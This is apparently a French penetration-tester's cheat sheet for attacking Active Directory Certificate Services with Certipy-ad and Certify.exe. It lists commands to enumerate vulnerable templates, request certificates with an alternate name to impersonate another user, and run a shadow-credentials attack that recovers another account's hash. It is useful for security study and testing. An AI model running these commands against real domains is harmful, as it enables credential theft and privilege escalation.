Utilisation de Certipy-ad ou certify.exe afin d'interragir avec le serveur de certificat.
### Différentes vulnérabilités

![Pasted image 20240109171310](../../../../Files/Pasted%20image%2020240109171310.png)
### 🐧 Linux (certipy-ad)

#### Installation:

```bash
pip install certipy-ad
```

#### Enumération des certificats:

```bash
certipy-ad find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128

# Possibilité de récupérer les informations pour bloodhound:

certipy-ad find -u john@corp.local -p Passw0rd -bloodhound -dc-ip 172.16.126.128
```

#### Faire une demande de certificat (ici une demande du certificat User, sur le serveur de certificat corp-DC-CA et l'utilisateur john):

```bash
certipy-ad req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User
```

Si, dans bloodhound, on voit qu'un utilisateur peut écrire sur l'attribut `msDS-KeyCredentialLink` d'un autre compte, il est possible de récupérer le hash de cet autre compte (ici John peut écrire sur Jane):

```bash
certipy shadow auto -username John@corp.local -p Passw0rd -account Jane
```

---

### 🍔 Windows (certify.exe)

#### Enumération des certificats:

```powershell
certify.exe cas
```

#### Enumérer les templates:

```powershell
certify.exe find
```

#### Enumérer les templates vulnérables aux différentes attaques :

```powershell
certify.exe find /vulnerable
```

#### Demander un certificat:

```powershell
certify.exe /ca:host-serveur-certficat\DC-CA /template:certificat-vuln /altname:nom-alternatif
```
